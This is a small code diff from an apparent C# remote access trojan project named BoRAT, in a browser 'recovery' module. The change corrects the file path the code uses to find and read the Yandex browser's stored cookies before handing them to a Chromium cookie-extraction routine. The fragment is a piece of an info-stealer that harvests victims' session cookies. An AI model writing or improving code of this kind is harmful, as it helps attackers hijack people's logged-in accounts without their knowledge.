@@ -1,4 +1,5 @@
-﻿using System;
+﻿using BoRAT.Core.Data;
+using System;
 using System.Collections.Generic;
 using System.IO;
 using System.Text;
@@ -26,7 +27,7 @@ namespace BoRAT.Core.Recovery.Browsers
             try
             {
                 string datapath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData),
-                "Yandex\\Browser\\User Data\\Default\\Cookies");
+                "Yandex\\YandexBrowser\\User Data\\Default\\Cookies");
                 return ChromiumBase.Cookies(datapath, "Yandex");
             }
             catch (Exception)
